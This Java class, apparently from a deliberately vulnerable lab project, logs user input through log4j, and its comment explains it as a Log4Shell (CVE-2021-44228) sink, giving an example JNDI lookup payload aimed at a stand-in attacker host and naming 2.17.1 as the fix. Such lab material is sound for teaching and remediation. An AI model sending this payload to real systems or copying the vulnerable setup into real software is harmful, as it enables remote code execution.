package com.example.vulnlab;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Logs user-supplied input.
 *
 * <p><b>Vulnerability:</b> with {@code log4j-core 2.14.1} this is the classic
 * Log4Shell sink (CVE-2021-44228). A value such as
 * {@code ${jndi:ldap://attacker/a}} passed to {@link #handle(String)} is
 * interpreted by log4j's message lookup substitution and can trigger remote
 * class loading / RCE.
 *
 * <p>The API used here ({@code LogManager.getLogger}, {@code Logger.info}) is
 * stable across all log4j 2.x releases, so upgrading to the fixed 2.17.1 keeps
 * this class compiling and behaving identically — a compatible remediation.
 */
public class LoggingService {

    private static final Logger LOG = LogManager.getLogger(LoggingService.class);

    public String handle(String userInput) {
        LOG.info("Received user input: {}", userInput);
        return "logged:" + userInput;
    }
}
